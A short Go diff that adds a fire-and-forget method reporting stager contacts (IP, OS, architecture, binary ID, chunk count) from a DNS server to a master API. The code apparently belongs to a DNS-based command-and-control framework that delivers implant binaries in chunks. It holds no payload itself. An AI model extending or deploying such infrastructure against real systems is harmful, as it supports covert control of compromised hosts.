@@ -980,6 +980,24 @@ func (mc *MasterClient) GetStagerChunk(sessionID string, chunkIndex int, stagerI
 	return &chunkResp, nil
 }
 
+// NotifyStagerContact informs Master about a stager using cached binary (async, fire-and-forget)
+func (mc *MasterClient) NotifyStagerContact(stagerIP, os, arch, clientBinaryID string, totalChunks int) {
+	req := map[string]interface{}{
+		"dns_server_id":    mc.serverID,
+		"api_key":          mc.apiKey,
+		"stager_ip":        stagerIP,
+		"os":               os,
+		"arch":             arch,
+		"client_binary_id": clientBinaryID,
+		"total_chunks":     totalChunks,
+	}
+
+	_, err := mc.doRequest("POST", "/api/dns-server/stager/contact", req)
+	if err != nil && mc.debug {
+		logf("[Master Client] Failed to notify stager contact: %v", err)
+	}
+}
+
 // GetTaskStatus queries the Master for the current status of a task
 // This allows DNS servers to check if tasks were completed on other servers
 func (mc *MasterClient) GetTaskStatus(taskID string) (string, error) {
